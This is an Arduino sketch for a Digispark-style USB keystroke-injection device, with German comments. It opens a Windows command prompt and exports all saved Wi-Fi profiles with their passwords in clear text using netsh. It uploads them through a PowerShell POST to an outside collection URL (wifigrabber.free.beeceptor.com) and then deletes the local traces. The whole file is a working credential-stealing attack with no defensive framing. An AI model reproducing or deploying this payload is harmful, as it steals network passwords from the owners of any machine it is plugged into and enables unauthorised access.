#include "DigiKeyboardDe.h"

void setup() {
  DigiKeyboardDe.delay(3000);

  // Win+R öffnen
  DigiKeyboardDe.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboardDe.delay(700);

  // powershell hidden starten + mkdir Befehl
  DigiKeyboardDe.print("cmd");
    DigiKeyboardDe.sendKeyStroke(KEY_ENTER);
    DigiKeyboardDe.delay(700);

  DigiKeyboardDe.print("mkdir TempWLANProfiles");
    DigiKeyboardDe.sendKeyStroke(KEY_ENTER);
    DigiKeyboardDe.delay(700);

  DigiKeyboardDe.print("netsh wlan export profile key=clear folder=TempWLANProfiles");
    DigiKeyboardDe.sendKeyStroke(KEY_ENTER);
    DigiKeyboardDe.delay(700);

  DigiKeyboardDe.print("copy TempWLANProfiles\\*.xml WiFiPASS.txt");
    DigiKeyboardDe.sendKeyStroke(KEY_ENTER);
    DigiKeyboardDe.delay(700);

  DigiKeyboardDe.print("rmdir /s /q TempWLANProfiles");
    DigiKeyboardDe.sendKeyStroke(KEY_ENTER);
    DigiKeyboardDe.delay(700);

  DigiKeyboardDe.print("powershell -Command \"Invoke-WebRequest -Uri https://wifigrabber.free.beeceptor.com -Method POST -InFile .\\\\WiFiPASS.txt -ContentType application/x-www-form-urlencoded -UseBasicParsing\"");
    DigiKeyboardDe.sendKeyStroke(KEY_ENTER);
    DigiKeyboardDe.delay(1000);
  
  DigiKeyboardDe.print("del /q WiFiPass.txt");
    DigiKeyboardDe.sendKeyStroke(KEY_ENTER);
    DigiKeyboardDe.delay(700);
  
  DigiKeyboardDe.print("exit");
    DigiKeyboardDe.sendKeyStroke(KEY_ENTER);
    DigiKeyboardDe.delay(700);
}

void loop() {
}
